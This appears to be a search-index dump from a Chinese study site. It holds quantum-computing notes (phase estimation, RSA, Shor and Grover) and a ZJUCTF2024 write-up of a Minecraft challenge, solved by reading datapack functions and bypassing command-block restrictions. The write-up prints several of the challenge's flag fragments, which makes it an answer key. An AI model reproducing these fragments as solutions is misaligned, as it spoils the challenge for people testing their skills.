\\left\\lvert j_k \\mu \\right\\rangle \\xrightarrow{\\mathrm{C-U}^{2^{k - 1}}} \\left\\lvert j_k \\right\\rangle U^{j_k 2^{k-1}} \\left\\lvert \\mu \\right\\rangle \\] <p>\u56e0\u4e3a \\(U\\left\\lvert \\mu \\right\\rangle = e^{2\\pi i \\varphi} \\left\\lvert \\mu \\right\\rangle\\)\uff0c\u6240\u4ee5\uff1a</p> \\[     \\left\\lvert j_k \\right\\rangle U^{j_k 2^{k-1}} \\left\\lvert \\mu \\right\\rangle = \\frac{1}{\\sqrt{2}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i 2^{k - 1} \\varphi} \\left\\lvert 1 \\right\\rangle) \\left\\lvert \\mu \\right\\rangle \\]"},{"location":"cs/quantum/chapter3/#_8","title":"\u7b2c\u4e8c\u9636\u6bb5","text":"<p>\u7531 \\(\\varphi = \\overline{0.\\varphi_1 \\varphi_2 \\cdots \\varphi_n}\\) \u5f97\u7b2c\u4e00\u9636\u6bb5\u7ed3\u675f\u540e \\(R_p\\) \u7684\u91cf\u5b50\u6001\u4e3a\uff1a</p> \\[     \\frac{1}{\\sqrt{2^n}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.\\varphi_n}} \\left\\lvert 1 \\right\\rangle) \\otimes \\cdots \\otimes (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.\\varphi_1 \\varphi_2 \\cdots \\varphi_n}} \\left\\lvert 1 \\right\\rangle) \\] <p>\u6700\u540e\uff0c\u5bf9 \\(R_p\\) \u7684\u91cf\u5b50\u6001\u8fdb\u884c\u9006\u91cf\u5b50\u5085\u7acb\u53f6\u53d8\u6362\uff08IQFT\uff09\uff0c\u5f97 \\(\\left\\lvert \\varphi_1 \\varphi_2 \\cdots \\varphi_n \\right\\rangle\\)\uff0c\u4ece\u800c\u5f97\u5230 \\(\\varphi\\) \u7684\u4f30\u8ba1\u503c\u3002</p>"},{"location":"cs/quantum/chapter3/#shor","title":"Shor \u7b97\u6cd5","text":""},{"location":"cs/quantum/chapter3/#rsa","title":"RSA","text":"<p>\u5236\u9020\u516c\u94a5\u548c\u79c1\u94a5\uff1a</p> <ol> <li>\u83b7\u5f97\u4e24\u4e2a\u5927\u8d28\u6570 \\(p_1\\) \u548c \\(p_2\\)\u3002</li> <li>\u8ba1\u7b97 \\(n = p_1 p_2\\)\uff0c\\(\\phi(n) = (p_1 - 1)(p_2 - 1)\\)\u3002</li> <li>\u53d6\u4e00\u4e2a\u4e0e \\(\\phi(n)\\) \u4e92\u8d28\u7684\u6574\u6570 \\(e\\)\u3002</li> <li>\u8ba1\u7b97 \\(e\\) \u5728\u6a21 \\(\\phi(n)\\) \u4e0b\u7684\u9006\u5143 \\(d\\)\uff0c\u6ee1\u8db3 \\(ed \\equiv 1 \\mod \\phi(n)\\)\u3002</li> <li>\u516c\u94a5\u4e3a \\((n, e)\\)\uff0c\u79c1\u94a5\u4e3a \\((n, d)\\)\u3002</li> </ol> <p>\u63a5\u6536\u65b9\u8ba1\u7b97\u51fa\u516c\u94a5\u548c\u79c1\u94a5\u540e\uff0c\u5c06\u516c\u94a5\u53d1\u9001\u7ed9\u53d1\u9001\u65b9\uff0c\u53d1\u9001\u65b9\u4f7f\u7528\u516c\u94a5\u52a0\u5bc6\u4fe1\u606f\uff0c\u63a5\u6536\u65b9\u4f7f\u7528\u79c1\u94a5\u89e3\u5bc6\u4fe1\u606f\u3002</p> <ul> <li>\u53d1\u9001\u65b9\u52a0\u5bc6\u4fe1\u606f \\(a\\)\uff1a\\(C = a^e \\mod n\\)\u3002\u53d1\u9001\u5bc6\u6587 \\(C\\)\u3002</li> <li>\u63a5\u6536\u65b9\u89e3\u5bc6\u4fe1\u606f \\(C\\)\uff1a\\(a = C^d \\mod n\\)\u3002</li> </ul> <p>\u7834\u89e3 RSA \u7684\u96be\u5ea6\u5728\u4e8e\u5206\u89e3 \\(n\\)\u3002</p>"},{"location":"cs/quantum/chapter3/#shor_1","title":"Shor \u7b97\u6cd5","text":"<p>Shor \u7b97\u6cd5\u5305\u542b\u7ecf\u5178\u8ba1\u7b97\u548c\u91cf\u5b50\u8ba1\u7b97\u3002</p> <p>\u7ecf\u5178\u8ba1\u7b97\u90e8\u5206\uff1a</p> <p>\u9636</p> <p>\u5b9a\u4e49 \\(r = \\mathrm{ord}_n(a)\\) \u4e3a\u6ee1\u8db3 \\(a^r \\equiv 1 \\mod n\\) \u7684\u6700\u5c0f\u6b63\u6574\u6570 \\(r\\)\uff0c\u79f0\u4e3a \\(a\\) \u5173\u4e8e\u6a21 \\(n\\) \u7684\u9636\u3002</p> <ol> <li>\u968f\u673a\u9009\u53d6\u5c0f\u4e8e \\(n\\) \u7684\u6574\u6570 \\(a\\)\uff0c\u4e14 \\(\\gcd(a, n) = 1\\)\u3002</li> <li>\u8ba1\u7b97 \\(r = \\mathrm{ord}_n(a)\\)\u3002\uff08\u91cf\u5b50\u8ba1\u7b97\u90e8\u5206\uff09</li> <li>\u82e5 \\(r\\) \u4e3a\u5947\u6570\uff0c\u56de\u5230\u7b2c\u4e00\u6b65\u3002</li> <li> <p>\u82e5 \\(r\\) \u4e3a\u5076\u6570\uff0c\u8ba1\u7b97 \\(x \\equiv a^{r/2} \\mod n\\)\uff0c\u5219</p> \\[     \\begin{aligned}         x^2 &amp;\\equiv 1 \\mod n \\\\         (x - 1)(x + 1) &amp;\\equiv 0 \\mod n     \\end{aligned} \\] <p>\u5219\u8bbe \\((x - 1)(x + 1) = tn = (t_1p_1)(t_2p_2)\\)\uff0c\u6709</p> \\[     \\begin{aligned}         x - 1 &amp;\\equiv 0 \\mod p_1 \\Rightarrow p_1 = \\gcd(x - 1, n) \\\\         x + 1 &amp;\\equiv 0 \\mod p_2 \\Rightarrow p_2 = \\gcd(x + 1, n)     \\end{aligned} \\] <p>\u82e5 \\(p_1 = 1\\) \u6216 \\(p_2 = 1\\)\uff0c\u56de\u5230\u7b2c\u4e00\u6b65\u3002\u5426\u5219\uff0c\u5f97\u5230 \\(p_1\\) \u548c \\(p_2\\) \u4e3a \\(n\\) \u7684\u8d28\u56e0\u6570\u3002</p> </li> </ol>"},{"location":"cs/quantum/chapter3/#shor_2","title":"Shor \u7b97\u6cd5\u6c42\u9636","text":"<p>\u5b9a\u4e49\u9149\u53d8\u6362 \\(U\\)\uff1a</p> \\[     \\begin{aligned}         &amp;U\\left\\lvert y \\right\\rangle = \\left\\lvert ay \\mod n \\right\\rangle \\\\         \\Rightarrow\\ &amp;U^2\\left\\lvert y \\right\\rangle = U\\left\\lvert ay \\mod n \\right\\rangle = \\left\\lvert a^2 y \\mod n \\right\\rangle \\\\         \\Rightarrow\\ &amp;U^t\\left\\lvert y \\right\\rangle = \\left\\lvert a^t y \\mod n \\right\\rangle     \\end{aligned} \\] <p>\u5b9a\u4e49\u91cf\u5b50\u6001 \\(\\left\\lvert u_s \\right\\rangle\\)\uff1a</p> \\[     \\left\\lvert u_s \\right\\rangle = \\frac{1}{\\sqrt{r}} \\sum_{k=0}^{r-1} e^{-\\frac{2\\pi i sk}{r}} \\left\\lvert a^k \\mod n \\right\\rangle \\] <p>\u6027\u8d28\uff1a</p> <ul> <li>\\(U\\left\\lvert u_s \\right\\rangle = e^{2\\pi i s / r} \\left\\lvert u_s \\right\\rangle\\)\u3002</li> <li>\\(\\displaystyle\\frac{1}{\\sqrt{r}} \\sum_{s=0}^{r-1} \\left\\lvert u_s \\right\\rangle = \\left\\lvert 1 \\right\\rangle\\)\u3002</li> </ul> <p>\u5bf9 \\(U\\) \u548c \\(\\left\\lvert 1 \\right\\rangle\\) \u8fdb\u884c QPE\uff0c\u5373\u53ef\u7b49\u6982\u7387\u5f97\u5230\u76f8\u4f4d \\(\\{0, 1/r, 2/r, \\cdots, (r-1)/r\\}\\)\u3002</p> <p>\u6784\u9020\u7b97\u5b50 \\(U\\)\uff1a\u4ee4 \\(f(x) = a^x \\mod n\\)\uff0c\u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684 \\(x\\)\uff0c\u5199\u51fa\u53d8\u6362\u524d\u7684\u91cf\u5b50\u6001 \\(\\left\\lvert x \\right\\rangle \\left\\lvert 0 \\right\\rangle\\)\uff0c\u53d8\u6362\u540e\u7684\u91cf\u5b50\u6001 \\(\\left\\lvert x \\right\\rangle \\left\\lvert f(x) \\right\\rangle\\)\uff0c\u6784\u9020 \\(U\\)\uff1a</p> \\[     U = \\sum_{x=0}^{n-1} \\left\\lvert x \\right\\rangle \\left\\lvert 0 \\right\\rangle \\left\\langle x \\right\\rvert \\left\\langle f(x) \\right\\rvert \\]"},{"location":"cs/quantum/chapter3/#grover","title":"Grover \u7b97\u6cd5","text":"<p>\u641c\u7d22\u7b97\u6cd5\uff0c\u7528\u4e8e\u5728\u65e0\u5e8f\u6570\u636e\u5e93\u4e2d\u641c\u7d22\u76ee\u6807\u5143\u7d20\uff0c\u5c06 \\(\\mathcal{O}(N)\\) \u7684\u7ecf\u5178\u65f6\u95f4\u590d\u6742\u5ea6\u964d\u4f4e\u5230 \\(\\mathcal{O}(\\sqrt{N})\\)\u3002</p> <p>\u8bbe\u6240\u6709\u6b63\u89e3\u7684\u53e0\u52a0\u6001\u4e3a \\(\\left\\lvert \\beta \\right\\rangle\\)\uff0c\u6240\u6709\u9519\u8bef\u89e3\u7684\u53e0\u52a0\u6001\u4e3a \\(\\left\\lvert \\alpha \\right\\rangle\\)\uff0c\u5219\uff1a</p> <p>Grover \u7b97\u6cd5\u901a\u8fc7\u65cb\u8f6c\u521d\u59cb\u91cf\u5b50\u6001\uff0c\u4f7f\u5176\u4e0d\u65ad\u63a5\u8fd1 \\(\\left\\lvert \\beta \\right\\rangle\\)\u3002</p>"},{"location":"cs/quantum/chapter3/#oracle","title":"Oracle","text":"<p>Oracle \u7528\u4e8e\u5224\u65ad\u5f53\u524d\u91cf\u5b50\u6001\u662f\u5426\u4e3a\u76ee\u6807\u6001\u3002</p> \\[     \\left\\lvert x \\right\\rangle \\xrightarrow{\\mathrm{Oracle}} (-1)^{f(x)} \\left\\lvert x \\right\\rangle \\] <p>\u5176\u4e2d \\(f(x) = 1\\) \u8868\u793a\u76ee\u6807\u6001\uff0c\\(f(x) = 0\\) \u8868\u793a\u975e\u76ee\u6807\u6001\u3002</p>"},{"location":"cs/quantum/chapter3/#grover_1","title":"Grover \u7b97\u5b50","text":""},{"location":"cs/quantum/chapter3/#oracle_1","title":"\u4f5c\u7528 Oracle","text":"<p>\u51e0\u4f55\u610f\u4e49\u662f\u5c06\u91cf\u5b50\u6001\u5173\u4e8e \\(\\left\\lvert \\alpha \\right\\rangle\\) \u7ffb\u8f6c\u3002</p>"},{"location":"cs/quantum/chapter3/#diffusion","title":"\u4f5c\u7528 Diffusion","text":"<p>\u9149\u77e9\u9635\u8868\u793a\u4e3a \\(H^{\\otimes n} (2\\left\\lvert 0^n \\right\\rangle \\left\\langle 0^n \\right\\rvert - I) H^{\\otimes n}\\)\uff0c\u4ee4 \\(\\left\\lvert \\psi \\right\\rangle = H^{\\otimes n} \\left\\lvert 0^n \\right\\rangle\\)\uff0c\u5219 Diffusion \u7b97\u5b50\u4e3a \\(U_s = (2\\left\\lvert \\psi \\right\\rangle \\left\\langle \\psi \\right\\rvert - I)\\)\u3002\u5373\u5c06\u91cf\u5b50\u6001\u5173\u4e8e \\(\\left\\lvert \\psi \\right\\rangle\\) \u7ffb\u8f6c\u3002</p> <p>\u7ffb\u8f6c\u7b97\u5b50</p> <p>\u8bbe \\(\\left\\lvert v \\right\\rangle = p\\left\\lvert \\psi \\right\\rangle + q\\left\\lvert \\psi \\right\\rangle_{\\perp}\\)\uff0c\u5219\uff1a</p> \\[     \\begin{aligned}         U_s \\left\\lvert v \\right\\rangle &amp;= (2\\left\\lvert \\psi \\right\\rangle \\left\\langle \\psi \\right\\rvert - I) (p\\left\\lvert \\psi \\right\\rangle + q\\left\\lvert \\psi \\right\\rangle_{\\perp}) \\\\         &amp;= 2p\\left\\lvert \\psi \\right\\rangle \\left\\langle \\psi \\vert \\psi \\right\\rangle + 2q\\left\\lvert \\psi \\right\\rangle \\left\\langle \\psi \\right\\rvert \\left\\lvert \\psi \\right\\rangle_{\\perp} - p\\left\\lvert \\psi \\right\\rangle - q\\left\\lvert \\psi \\right\\rangle_{\\perp}     \\end{aligned} \\] <p>\u7531\u4e8e\u5f52\u4e00\u5316\u6761\u4ef6\uff0c\u6709 \\(\\left\\lvert \\psi \\vert \\psi \\right\\rangle = 1\\)\uff0c\u6240\u4ee5</p> \\[     \\begin{aligned}         U_s \\left\\lvert v \\right\\rangle  &amp;= 2p\\left\\lvert \\psi \\right\\rangle - p\\left\\lvert \\psi \\right\\rangle - q\\left\\lvert \\psi \\right\\rangle_{\\perp} \\\\         &amp;= p\\left\\lvert \\psi \\right\\rangle - q\\left\\lvert \\psi \\right\\rangle_{\\perp}     \\end{aligned} \\] <p>\u6545\u7ffb\u8f6c\u7b97\u5b50 \\(U_s\\) \u7684\u4f5c\u7528\u662f\u5c06\u91cf\u5b50\u6001\u5173\u4e8e \\(\\left\\lvert \\psi \\right\\rangle\\) \u7ffb\u8f6c\u3002</p>"},{"location":"cs/quantum/chapter3/#_9","title":"\u51e0\u4f55\u610f\u4e49","text":"<p>\u8bc1\u660e\u4f5c\u7528\u4e00\u6b21 G \u7b97\u5b50\uff0c\u53ef\u4ee5\u5c06\u91cf\u5b50\u6001\u5411\u76ee\u6807\u6001 \\(\\left\\lvert \\beta \\right\\rangle\\) \u65cb\u8f6c \\(\\theta\\) \u89d2\u5ea6\u3002\u5373</p> \\[     G^k \\left\\lvert \\psi \\right\\rangle = \\cos(\\frac{2k + 1}{2} \\theta) \\left\\lvert \\alpha \\right\\rangle + \\sin(\\frac{2k + 1}{2} \\theta) \\left\\lvert \\beta \\right\\rangle \\] <p>\u8bbe\u521d\u59cb\u6001\u4e2d\u6709 \\(M\\) \u4e2a\u76ee\u6807\u6001\uff0c\\(N - M\\) \u4e2a\u975e\u76ee\u6807\u6001\uff0c\u5219</p> \\[     \\psi = \\sqrt{\\frac{N - M}{N}} \\left\\lvert \\alpha \\right\\rangle + \\sqrt{\\frac{M}{N}} \\left\\lvert \\beta \\right\\rangle \\] <p>\u5219 \\(\\theta/2\\) \u4e3a\u521d\u59cb\u6001\u4e0e \\(\\left\\lvert \\alpha \\right\\rangle\\) \u7684\u5939\u89d2\uff0c\u6709</p> \\[     \\theta = 2 \\arccos(\\sqrt{\\frac{N - M}{N}}) \\]"},{"location":"cs/quantum/chapter3/#_10","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<p>\u5047\u8bbe \\(M \\ll N\\)\uff0c\u5219\u6709\u8fd1\u4f3c</p> \\[     \\theta \\approx \\sin(\\theta) = \\frac{2\\sqrt{M(N - M)}}{N} \\approx 2\\sqrt{\\frac{M}{N}} \\] <p>\u8981\u8ba9\u91cf\u5b50\u6001\u63a5\u8fd1 \\(\\left\\lvert \\beta \\right\\rangle\\)\uff0c\u5373\u4ee4 \\(\\displaystyle\\frac{2k + 1}{2} \\theta = \\frac{\\pi}{2}\\)\uff0c\u4ee3\u5165\u4e0a\u5f0f\u5f97</p> \\[     k = \\frac{\\pi}{2\\theta} - \\frac{1}{2} \\approx \\frac{\\pi}{4} \\sqrt{\\frac{N}{M}} - \\frac{1}{2} = \\mathcal{O}(\\sqrt{N/M}) \\] <p>\u6240\u4ee5 Grover \u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u4e3a \\(\\mathcal{O}(\\sqrt{N/M})\\)\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/","title":"ZJUCTF2024 Writeup","text":""},{"location":"ctf/writeups/zjuctf2024/#misc","title":"Misc","text":""},{"location":"ctf/writeups/zjuctf2024/#minecretf","title":"Minec(re)tf","text":"<p>\u6700\u559c\u6b22\u7684 MC \u9898\u3002</p> <p>\u7ed9\u4e86\u4e00\u4e2a\u5b58\u6863\u548c\u4e00\u4e2a testmod\uff0c\u8fd8\u7ed9\u4e86\u6e38\u620f\u7248\u672c 1.20.4 \u548c fabric \u7248\u672c\uff0c\u4e0b\u8f7d\u4e0b\u6765\u6253\u5f00\u5b58\u6863\u770b\u770b\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#start","title":"Start","text":"<p>\u8fdb\u5165\u5b58\u6863\u540e\u51fa\u751f\u70b9\u5728\u4e00\u4e2a box \u91cc\u9762\uff0c\u6e38\u620f\u6a21\u5f0f\u662f spectator\u3002</p> <p>\u5c1d\u8bd5\u66f4\u6539\u6e38\u620f\u6a21\u5f0f\uff0c\u7acb\u523b\u4f1a\u88ab\u6539\u56de spectator\uff1b\u5c1d\u8bd5\u8d70\u51fa box \u4f1a\u88ab\u7acb\u523b\u4f20\u9001\u56de\u6765\u3002\u544a\u793a\u724c\u63d0\u793a \u201cthese constrains must be activated EVERY TICK\u201d\uff0c\u4e5f\u5c31\u662f\u68c0\u67e5\u73a9\u5bb6\u6e38\u620f\u6a21\u5f0f/\u4f4d\u7f6e\u7684\u6307\u4ee4\u6bcf tick \u90fd\u4f1a\u6267\u884c\u3002</p> <p>\u4f17\u6240\u5468\u77e5\uff0ctick \u662f\u53ef\u88ab\u547d\u4ee4\u63a7\u5236\u7684\uff0c\u4e8e\u662f\u76f4\u63a5 <code>/tick freeze</code>\uff0c\u6b64\u65f6\u5c31\u968f\u4fbf\u6539\u6e38\u620f\u6a21\u5f0f\u8d70\u51fa box \u4e86\u3002</p> <p>\u4f46\u663e\u7136 tick \u4e00\u76f4\u88ab\u51bb\u7ed3\u662f\u6ca1\u6cd5\u7ee7\u7eed\u8fdb\u884c\u7684\uff0c\u9700\u8981\u627e\u5230\u9650\u5236\u6211\u4eec\u884c\u4e3a\u7684\u547d\u4ee4\u65b9\u5757\uff08\uff1f\uff09\u7684\u4f4d\u7f6e\u3002\u8fd9\u91cc\u5e94\u8be5\u53ef\u4ee5\u7528 NBTExplorer \u627e\u547d\u4ee4\u65b9\u5757\uff0c\u4f46\u4e0d\u77e5\u4e3a\u4f55\u4e00\u627e command_block \u5c31\u5361\u6b7b\uff08\u53ef\u80fd\u547d\u4ee4\u65b9\u5757\u592a\u591a\u4e86\uff1f\u6bd5\u7adf\u6709\u4e00\u6574\u4e2a\u533a\u5757\u7684\u547d\u4ee4\u65b9\u5757\uff09\u3002</p> <p>\u7f51\u4e0a\u5230\u5904\u641c\u641c\uff0c\u641c\u5230\u4e86 CommandSpy \u8fd9\u4e2a mod\uff0c\u53ef\u4ee5\u663e\u793a\u6b63\u5728\u6267\u884c\u7684\u547d\u4ee4\u7684\u53d1\u9001\u8005\u4fe1\u606f\uff0c\u4f46\u8fd9\u4e2a mod \u6700\u9ad8\u5230 1.20\uff0c\u6ca1\u6cd5\u653e\u8fdb 1.20.4\u3002</p> <p>\u8fd9\u4e2a\u597d\u529e\uff0c\u4e0b\u4e2a 1.20 \u7136\u540e\u964d\u7ea7\u5b58\u6863\u518d\u6253\u5f00\uff0c\u6b64\u65f6\u63a7\u5236\u53f0\u4e0a\u5c31\u4f1a\u663e\u793a\u6b63\u5728\u6267\u884c\u7684\u547d\u4ee4\u65b9\u5757\u7684\u4f4d\u7f6e\u4e86\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u53ea\u6709 5 \u4e2a\u547d\u4ee4\u65b9\u5757\u5728\u5faa\u73af\u6267\u884c\uff0c\u5168\u90fd\u5728 run \u67d0\u4e2a function\uff0c\u8fd9\u4e9b function \u770b\u7740\u4e0d\u50cf\u539f\u7248\u7684\uff0c\u5e94\u8be5\u662f\u6570\u636e\u5305\u5f15\u5165\u7684\u3002\u4e8e\u662f\u6253\u5f00\u5b58\u6863\u76ee\u5f55\u4e0b <code>datapacks</code> \u6587\u4ef6\u5939\uff0c\u627e\u5230\u4e0a\u9762\u7684 function \u5185\u5bb9\u3002</p> <p>\u5148\u770b\u770b <code>lobby/tptolobby.mcfunction</code>\uff1a</p> <pre><code>tp @a[tag=!inlobby] 50 53 50\nspawnpoint @a[tag=!inlobby] 50 53 50\ntag @a[tag=!inlobby] add inlobby\n</code></pre> <p>\u597d\u50cf\u6ca1\u4ec0\u4e48\u7528\uff0c\u73a9\u5bb6\u4e00\u76f4\u90fd\u6709 <code>inlobby</code> \u6807\u7b7e\u3002\u518d\u770b\u770b <code>obfuscation/775533.mcfunction</code>\uff1a</p> <pre><code>gamemode spectator @a\n\nsay The map is under construction. I can only view the map\ngive @a repeating_command_block{display:{Name:'[\"\",{\"text\":\"Script Engine\",\"italic\":false,\"color\":\"aqua\",\"bold\":true}]',Lore:['[\"\",{\"text\":\"Flag Piece[3/9]:cjRmNydz\",\"italic\":false},{\"text\":\"\",\"italic\":false}]','[\"\",{\"text\":\"\\\\\"\",\"color\":\"#b2aca2\"},{\"text\":\"the script engine of the flag.\",\"color\":\"#b2aca2\"},{\"text\":\"\",\"italic\":false},{\"text\":\"\\\\\"\",\"color\":\"#b2aca2\"}]','[\"\",{\"text\":\"You ask me why a flag need a script engine? How could the flag fly without a script engine to run the phisics simulation?\",\"italic\":false,\"color\":\"#e8e6e3\"},{\"text\":\"\",\"italic\":false},{\"text\":\"\",\"italic\":false},{\"text\":\"\",\"italic\":false}]']}}\nclear @a\n</code></pre> <p>\u770b\u6765\u8fd9\u4e2a\u5c31\u662f\u5f3a\u5236\u73a9\u5bb6\u6a21\u5f0f\u4e3a spectator \u7684\u547d\u4ee4\u65b9\u5757\uff0c\u540c\u65f6\u7ed9\u4e86\u4e00\u4e2a flag piece <code>Flag Piece[3/9]:cjRmNydz</code>\u3002\u8fdb\u5165\u6e38\u620f\u628a\u5bf9\u5e94\u4f4d\u7f6e\u7684\u547d\u4ee4\u65b9\u5757\u62c6\u6389\u5c31\u80fd\u6539\u6a21\u5f0f\u4e86\u3002</p> <p>\u6d4f\u89c8\u4e00\u4e0b <code>obfuscation</code> \u76ee\u5f55\uff0c\u6bcf\u4e2a function \u90fd\u4f1a\u7ed9 flag piece\uff0c\u4f46\u76f8\u540c flag piece \u4f1a\u7ed9\u65e0\u6570\u4e2a\uff0c\u679c\u7136\u662f obfuscation\u3002\u628a 9 \u4e2a piece \u90fd\u641c\u4e00\u4e0b\uff0c\u53d1\u73b0 <code>Flag Piece[9/9]</code> \u53ea\u6709\u4e00\u4e2a\uff0c\u60f3\u5fc5\u5c31\u662f\u7b2c 9 \u4e2a piece \u4e86\uff0c\u5f97\u5230 <code>Flag Piece[9/9]:bWl6RUR9</code>\u3002</p> <p>\u518d\u641c\u4e00\u4e0b\u6700\u540e\u4e00\u4e2a\u8fd0\u884c\u4e2d\u7684\u547d\u4ee4\u65b9\u5757\uff0c\u8fd9\u4e2a\u547d\u4ee4\u65b9\u5757\u6267\u884c\u7684\u547d\u4ee4\u662f\uff1a</p> <pre><code>execute as @a[scores={spawner_mined=1000000..},tag=!recived_reward] run function obfuscation:585664\n</code></pre> <p>\u68c0\u6d4b\u73a9\u5bb6 spawner_mined \u5206\u6570\u5927\u4e8e 1000000\uff0c\u8fd0\u884c <code>obfuscation:585664</code>\u3002\u8fd9\u4e2a function \u91cc\u9762\u662f\uff1a</p> <pre><code># tp @a 50 62 50\n\nsay You've reached 1000000 Score, here's your reward\ngive @s white_dye{display:{Name:'[\"\",{\"text\":\"Pure Dye\",\"italic\":false,\"color\":\"aqua\",\"bold\":true}]',Lore:['[\"\",{\"text\":\"Flag Piece[7/9]:SUF5X2lU\",\"italic\":false}]','[\"\",{\"text\":\"\\\\\"You need some dye to draw on the flag\\\\\"\",\"color\":\"#b2aca2\"}]','[\"\",{\"text\":\"Scoreboard and tags, the old school cmb.\",\"italic\":false,\"color\":\"#e8e6e3\"}]']}}\ntag @s add recived_reward\nscoreboard players remove @s spawner_mined 1000000\n</code></pre> <p>\u770b\u6765\u662f\u6316\u6389 1000000 \u4e2a\u5237\u602a\u7b3c\u4f1a\u7ed9 flag piece\uff0c\u5f97\u5230 <code>Flag Piece[7/9]:SUF5X2lU</code>\u3002</p> <p>\u975e\u9884\u671f\uff1f</p> <p>\u8fd0\u884c <code>obfuscation:585664</code> \u7684\u8fd9\u4e2a\u547d\u4ee4\u65b9\u5757\u85cf\u5728\u4e86\u90a3\u4e00\u4e2a\u533a\u5757\u547d\u4ee4\u65b9\u5757\u91cc\u9762\uff0c\u4f46\u662f\u5728\u8fd9\u4e2a\u533a\u5757\u6700\u5e95\u4e0b\u6709\u4e2a\u51f8\u51fa\u6765\u7684\u547d\u4ee4\u65b9\u5757\uff0c\u91cc\u9762\u8fd0\u884c\u7684\u547d\u4ee4\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u6ca1\u6709\u4fdd\u6301\u5f00\u542f\uff0c\u5b9e\u9645\u4e0a\u8fd8\u662f\u5185\u90e8\u7684\u547d\u4ee4\u65b9\u5757\u5728\u68c0\u67e5\u3002\u6211\u5148\u627e\u5230\u5e95\u4e0b\u8fd9\u4e2a\uff0c\u76f4\u63a5\u62ff\u5230 flag \u4e86\u3002</p> <p>\u518d\u56de\u5230\u6e38\u620f\uff0c\u8fd8\u662f\u6ca1\u6cd5\u51fa\u53bb\uff0c\u8bf4\u660e\u6b64\u65f6\u4e0d\u662f\u547d\u4ee4\u65b9\u5757\u5728\u6267\u884c\u547d\u4ee4\u4e86\u3002</p> <p>\u8fd9\u91cc\u5361\u4e86\u5f88\u4e45\uff0c\u7f51\u4e0a\u641c\u4e86\u5f88\u4e45\uff0c\u624d\u77e5\u9053 datapack \u53ef\u4ee5\u6bcf tick \u6267\u884c\u4e00\u6b21\u51fd\u6570\u3002\u8fdb\u5165\u6570\u636e\u5305\u7684 <code>minecraft/tags/functions</code> \u76ee\u5f55\uff0c\u627e\u5230 <code>tick.json</code>\uff1a</p> <pre><code>{\"values\":[\"main:loop\"]}\n</code></pre> <p>\u6570\u636e\u5305\u6bcf tick \u6267\u884c <code>main:loop</code>\uff0c\u627e\u5230 <code>main</code> \u76ee\u5f55\u4e0b\u7684 <code>loop.mcfunction</code>\uff1a</p> <pre><code>...\ntag @a[x=48,y=61,z=48,dx=4,dy=2,dz=4] add in_box\nexecute as @a[tag=!in_box] run function obfuscation:317754\ntag @a remove in_box\n</code></pre> <p>\u68c0\u67e5\u73a9\u5bb6\u662f\u5426\u5728\u4e00\u4e2a 4x2x4 \u7684 box \u91cc\u9762\uff0c\u4e0d\u5728\u7684\u8bdd\u6267\u884c <code>obfuscation:317754</code>\u3002\u8fd9\u4e2a function \u91cc\u9762\u662f\uff1a</p> <pre><code>tp @s 50 62 50\n\nsay The map is under construction. I can only stay in the view box\ngive @s paper{display:{Name:'[\"\",{\"text\":\"Code\",\"italic\":false,\"color\":\"aqua\",\"bold\":true}]',Lore:['[\"\",{\"text\":\"Flag Piece[2/9]:e01pTkVj\",\"italic\":false},{\"text\":\"\",\"italic\":false},{\"text\":\"\",\"italic\":false}]','[\"\",{\"text\":\"\\\\\"\",\"color\":\"#b2aca2\"},{\"text\":\"the code of the flag.\",\"italic\":false,\"color\":\"#b2aca2\"},{\"text\":\"\",\"italic\":false},{\"text\":\"\",\"italic\":false},{\"text\":\"\\\\\"\",\"color\":\"#b2aca2\"}]','[\"\",{\"text\":\"You ask me why a flag need any code?\",\"italic\":false,\"color\":\"#e8e6e3\"}]','[\"\",{\"text\":\"How could the flag fly without some code to specify the behavior of the phisics simulation?\",\"italic\":false,\"color\":\"#e8e6e3\"},{\"text\":\"\",\"italic\":false},{\"text\":\"\",\"italic\":false},{\"text\":\"\",\"italic\":false},{\"text\":\"\",\"italic\":false}]']}}\nclear @s\n</code></pre> <p>\u5f97\u5230 <code>Flag Piece[2/9]:e01pTkVj</code>\u3002\u628a <code>loop.mcfunction</code> \u91cc\u90a3\u4e09\u884c\u6ce8\u91ca\u6389\uff0c\u91cd\u65b0\u52a0\u8f7d\u4e00\u4e0b\u6570\u636e\u5305\u5c31\u80fd\u8d70\u51fa box \u4e86\u3002</p> <p>box \u5e95\u4e0b\u662f\u4e2a RPG \u5730\u56fe\uff0c\u901a\u5173\u4e86\u4e5f\u6ca1\u4ec0\u4e48\u7528\u3002</p> <p>\u5728 datapacks \u91cc\u9762\u518d\u627e\u627e\uff0c<code>main/recipes</code> \u91cc\u9762\u6709\u4e2a <code>flag_look_at_the_code_of_the_recipe.json</code>\u3002\u5f88\u957f\uff0c\u53ea\u770b\u7b2c\u4e00\u884c\uff1a</p> <p>Note that this recipe would note be recognized by vanilla minecraft, read the code your self! (or you can give yourself the items by /function obfuscation:855371)</p> <p>\u8fdb\u5165\u6e38\u620f\uff0c\u6267\u884c <code>/function obfuscation:855371</code>\uff0c\u80cc\u5305\u91cc\u5c31\u6709\u5404\u4e2a piece \u7684\u63d0\u793a\u4e86\uff1a</p> <p>\u7b2c\u4e00\u4e2a piece \u76f4\u63a5\u7ed9\u4e86\uff0c\u5f97\u5230 <code>Flag Piece[1/9]:WkpVQ1RG</code>\u3002\u63a5\u4e0b\u6765\u8fd8\u8981\u627e\u7b2c 4\u30015\u30016\u30018 \u4e2a piece\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#flag-piece-4","title":"Flag Piece 4","text":"<p>There are different model of wool in this world. Only the unused one(a special resources) can be used to craft a flag.Note: this piece is not an item!</p> <p>\u6709\u4e00\u4e2a wool \u7684\u6a21\u578b\u85cf\u4e86 flag piece\u3002\u6253\u5f00\u5b58\u6863\u76ee\u5f55\u4e0b\u7684 <code>resources.zip</code>\uff0c\u627e wool \u7684\u6a21\u578b\uff0c\u5728 <code>assets/minecraft/models/block</code> \u91cc\u9762\u627e\u5230 <code>lightblue_wool.json</code> \u6709\u70b9\u53ef\u7591\u3002</p> <p>credit \u8bf4 <code>Made 